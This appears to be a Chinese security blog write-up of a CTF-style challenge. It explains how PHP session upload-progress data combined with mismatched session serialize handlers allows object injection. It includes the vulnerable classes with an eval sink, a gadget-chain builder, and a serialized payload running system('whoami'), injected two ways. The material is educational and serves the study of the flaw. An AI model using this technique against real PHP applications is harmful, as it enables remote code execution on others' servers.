<p> <strong>session上传进度：</strong><br><strong>参考</strong>：<a href="http://php.net/manual/zh/session.upload-progress.php" target="_blank" rel="external">upload-progress</a><br>当 <code>session.upload_progress.enabled INI</code> 选项开启时，在一个上传处理中，在表单中添加一个与INI中设置的<code>session.upload_progress.name</code>同名变量时，$_SESSION中就会添加一个保存上传信息的session值，它的session名是 INI 中定义的<code>session.upload_progress.prefix</code>加表单中的post的<code>session.upload_progress.name</code></p>
<p>测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"POST"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line"> &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"&lt;?php echo ini_get("</span>session.upload_progress.name<span class="string">"); ?&gt;"</span> value=<span class="string">"123"</span> /&gt;</span><br><span class="line"> &lt;input type=<span class="string">"file"</span> name=<span class="string">"123123"</span> /&gt;</span><br><span class="line"> &lt;input type=<span class="string">"submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"> session_start();</span><br><span class="line"> var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>运行结果：<br><img src="http://dassec.b0.upaiyun.com/kovige/1468567761183.jpg" alt="上传进度session值"><br>（要查看到上传session，INI貌似要设置这个session.upload_progress.cleanup = Off）</p>
<p><strong>session序列化处理器:</strong><br><strong>参考</strong>：<a href="http://wps2015.org/drops/drops/PHP%20Session%20%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%84%E7%90%86%E5%99%A8%E8%AE%BE%E7%BD%AE%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93%E5%B8%A6%E6%9D%A5%E7%9A%84%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3.html" target="_blank" rel="external">session序列化</a><br>当session.auto_start = 0时：<br>两个脚本注册 Session 会话时使用的序列化处理器（session.serialize_handler）不同，就会出现安全问题。<br>经过测试发现在1.php页面注册session.serialize_handler=‘php_serialize’；<br>在2.php中注册session.serialize_handler=‘php’；<br>那么在1.php中伪造一个格式为：竖线加上对象序列化后的字符串<br>如：<code>|O:4:&quot;ryat&quot;:1:{s:2:&quot;hi&quot;;s:4:&quot;ryat&quot;;}</code><br>那么会按照 php 处理器的反序列化格式读取数据，成功地实例化了该对象。<br>反之，如果是从php-&gt;php_serialize,是不可行的。<br>当session.auto_start = 1时：<br>只能注入 PHP 的内置类</p>
<p>web3 源码：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">class.php:</span><br><span class="line"></span><br><span class="line">    &lt;?php </span><br><span class="line">    class foo1&#123;</span><br><span class="line">            public $varr;</span><br><span class="line">            function __construct()&#123;</span><br><span class="line">                    $this-&gt;varr = "index.php";</span><br><span class="line">            &#125;</span><br><span class="line">            function __destruct()&#123;</span><br><span class="line">                    if(file_exists($this-&gt;varr))&#123;</span><br><span class="line">                            echo $this-&gt;varr;</span><br><span class="line">                    &#125;</span><br><span class="line">                    echo "这是foo1的析构函数";</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    class foo2&#123;</span><br><span class="line">            public $varr;</span><br><span class="line">            public $obj;</span><br><span class="line">            function __construct()&#123;</span><br><span class="line">                    $this-&gt;varr = '1234567890';</span><br><span class="line">                    $this-&gt;obj = null;</span><br><span class="line">            &#125;</span><br><span class="line">            function __toString()&#123;</span><br><span class="line">                    $this-&gt;obj-&gt;execute();</span><br><span class="line">                    return $this-&gt;varr;</span><br><span class="line">            &#125;</span><br><span class="line">            function __desctuct()&#123;</span><br><span class="line">                    echo "这是foo2的析构函数";</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    class foo3&#123;</span><br><span class="line">            public $varr;</span><br><span class="line">            function execute()&#123;</span><br><span class="line">                    eval($this-&gt;varr);</span><br><span class="line">            &#125;</span><br><span class="line">            function __desctuct()&#123;</span><br><span class="line">                    echo "这是foo3的析构函数";</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure></p>
<p>index.php:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">    ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">require</span>(<span class="string">"./sessionTest.php"</span>);</span><br><span class="line">     </span><br><span class="line">    session_start();</span><br><span class="line">    <span class="variable">$obj</span> = <span class="keyword">new</span> foo1();</span><br><span class="line">     </span><br><span class="line">    <span class="variable">$obj</span>-&gt;varr = <span class="string">"phpinfo.php"</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>想办法让程序执行foo3的excute()函数，就要通过foo2的<strong>toString(),要执行foo2的</strong>toString()就要通过echo foo2，刚好foo1的__deatruct()有段这样的代码<code>echo $this-&gt;varr;</code></p>
<p>所以这样构造：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'class.php'</span>);</span><br><span class="line"><span class="variable">$t1</span> = <span class="keyword">new</span> foo1;</span><br><span class="line"><span class="variable">$t2</span> = <span class="keyword">new</span> foo2;</span><br><span class="line"><span class="variable">$t3</span> = <span class="keyword">new</span> foo3;</span><br><span class="line"><span class="variable">$t3</span>-&gt;varr = <span class="string">"system('whoami');"</span>;</span><br><span class="line"><span class="variable">$t2</span>-&gt;obj = <span class="variable">$t3</span>;</span><br><span class="line"><span class="variable">$t1</span>-&gt;varr = <span class="variable">$t2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s1</span> = serialize(<span class="variable">$t1</span>);</span><br><span class="line">var_dump(<span class="variable">$s1</span>);</span><br></pre></td></tr></table></figure></p>
<p>构造出这样一串：<strong>O:4:”foo1”:1:{s:4:”varr”;O:4:”foo2”:2:{s:4:”varr”;s:10:”1234567890”;s:3:”obj”;O:4:”foo3”:1:{s:4:”varr”;s:17:”system(‘whoami’);”;}}}</strong></p>
<p>所以构造一个表单，向class.php上传文件，通过session上传进度保存的session，来触发session序列化漏洞，由于INI中设置的序列化处理器为php_serialize，而index.php中将其设置为php，就使得伪造的session被成功地实例化了。<br>有两类不同的插法~<br>1、将序列化字符串插入PHP_SESSION_UPLOAD_PROGRESS<br>session名变成了PHP_SESSION_UPLOAD_PROGRESS_123,|后面的payload会替换整个session值<br><img src="http://dassec.b0.upaiyun.com/kovige/1468571622855.jpg" alt="插入PHP_SESSION_UPLOAD_PROGRESS"></p>
<p>结果：<br><img src="http://dassec.b0.upaiyun.com/kovige/1468571947277.jpg" alt="结果_1"></p>
<p>2、将序列化字符串插入post内容中<br>因为session会存上传文件的内容和文件名，所以也可以将序列化字符串插入name、filename.文件上传原本的session值一直到name前面一个参数为止，变成了session名，name参数|后面的payload变成了session值<br><img src="http://dassec.b0.upaiyun.com/kovige/1468572495614.jpg" alt="插入post"></p>
<p>结果：<br><img src="http://dassec.b0.upaiyun.com/kovige/1468572538300.jpg" alt="结果_2"></p>
<p>参考链接：<br><a href="http://drops.wooyun.org/papers/4820" target="_blank" rel="external">php对象注入</a><br><a href="http://php.net/manual/zh/session.upload-progress.php" target="_blank" rel="external">upload-progress</a><br><a href="http://drops.wooyun.org/tips/3909" target="_blank" rel="external">session序列化</a></p>

      
    </div>
    
    
    
      <footer class="article-footer">
        
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kovige/">kovige</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/">php</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/session/">session</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/对象/">对象</a></li></ul>

      </footer>
    
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="/2016/08/25/waf-sql-bypass/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">浅谈WAF下的SQL注入绕过&nbsp;<span>&gt;</span></div>
    </a>
  
</nav>

  
</article>

  
  <section id="comments">
    <!-- 多说评论框 start -->
    <div class="ds-thread" data-thread-key="post-php-serialize" data-title="PHP序列化学习总结" data-url="http://das.scusec.org/2016/08/25/php-serialize/"></div>
    <!-- 多说评论框 end -->
    <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
    <script type="text/javascript">
    var duoshuoQuery = {short_name:'dassec'};
      (function() {
        var ds = document.createElement('script');
        ds.type = 'text/javascript';ds.async = true;
        ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
        ds.charset = 'UTF-8';
        (document.getElementsByTagName('head')[0] 
         || document.getElementsByTagName('body')[0]).appendChild(ds);
      })();
      </script>
    <!-- 多说公共JS代码 end -->
  </section>
  </section>
    <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2016 das&nbsp;
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>, theme by <a href="http://github.com/ppoffice">PPOffice</a>，<a href="http://das.scusec.org/atom.xml">RSS</a>
    </div>
  </div>
</footer>
    

<script src="/js/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
  <script src="/fancybox/jquery.fancybox.pack.js" type="text/javascript"></script>


<script src="/js/script.js" type="text/javascript"></script>
  </div>
</body>
</html>